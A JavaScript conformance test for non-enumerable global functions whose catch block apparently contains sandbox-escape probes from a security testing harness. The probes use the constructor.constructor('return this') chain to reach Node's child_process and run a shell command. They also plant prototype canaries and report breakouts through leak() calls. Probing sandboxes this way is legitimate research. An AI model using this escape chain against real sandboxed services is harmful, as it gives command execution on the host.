try {
    for (var x in this) {
        if (x === 'eval') {
            $ERROR('#1: \'eval\' have attribute DontEnum');
        } else if (x === 'parseInt') {
            $ERROR('#1: \'parseInt\' have attribute DontEnum');
        } else if (x === 'parseFloat') {
            $ERROR('#1: \'parseFloat\' have attribute DontEnum');
        } else if (x === 'isNaN') {
            $ERROR('#1: \'isNaN\' have attribute DontEnum');
        } else if (x === 'isFinite') {
            $ERROR('#1: \'isFinite\' have attribute DontEnum');
        } else if (x === 'decodeURI') {
            $ERROR('#1: \'decodeURI\' have attribute DontEnum');
        } else if (x === 'decodeURIComponent') {
            $ERROR('#1: \'decodeURIComponent\' have attribute DontEnum');
        } else if (x === 'encodeURI') {
            $ERROR('#1: \'encodeURI\' have attribute DontEnum');
        } else if (x === 'encodeURIComponent') {
            $ERROR('#1: \'encodeURIComponent\' have attribute DontEnum');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}